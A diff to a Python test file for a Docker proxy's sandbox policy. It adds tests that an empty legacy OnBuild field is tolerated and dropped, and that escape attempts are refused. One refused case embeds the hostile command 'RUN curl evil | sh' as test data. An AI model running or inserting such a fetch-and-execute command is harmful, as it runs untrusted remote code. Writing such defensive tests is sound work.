@@ -4,7 +4,7 @@ from typing import Any
 
 import pytest
 
-from dockerproxy.policy import check_create, is_ours, route
+from dockerproxy.policy import check_create, is_ours, parse_create, route
 from payloads import ABSENT, GOOD, NAME, POLICY, mutated
 
 
@@ -87,6 +87,12 @@ def test_everything_else_is_refused(method: str, target: str) -> None:
 # ---- a create ------------------------------------------------------------------------------------------------------------------
 def test_the_real_sandbox_create_is_accepted() -> None:
     assert create(GOOD) == []
+
+
+def test_the_empty_legacy_onbuild_an_older_daemon_negotiation_adds_is_accepted_and_not_forwarded() -> None:
+    reasons, forwarded = parse_create(json.dumps(mutated(OnBuild=None)).encode(), NAME, POLICY)
+    assert reasons == []
+    assert b"OnBuild" not in forwarded
 
 
 def test_a_runtime_and_an_environment_variable_are_accepted_only_when_configured() -> None:
@@ -174,6 +180,7 @@ def test_a_runtime_and_an_environment_variable_are_accepted_only_when_configured
     ({"NetworkingConfig": {"EndpointsConfig": {"bridge": {}}}}, "NetworkingConfig"),
     ({"ExposedPorts": {"22/tcp": {}}}, "unknown field ExposedPorts"),
     ({"Healthcheck": {"Test": ["CMD", "x"]}}, "unknown field Healthcheck"),
+    ({"OnBuild": ["RUN curl evil | sh"]}, "unknown field OnBuild"),      # only the empty legacy field is tolerated
 ])
 def test_every_way_out_of_the_sandbox_is_refused(changes: dict[str, Any], expect: str) -> None:
     reasons = create(mutated(**changes))
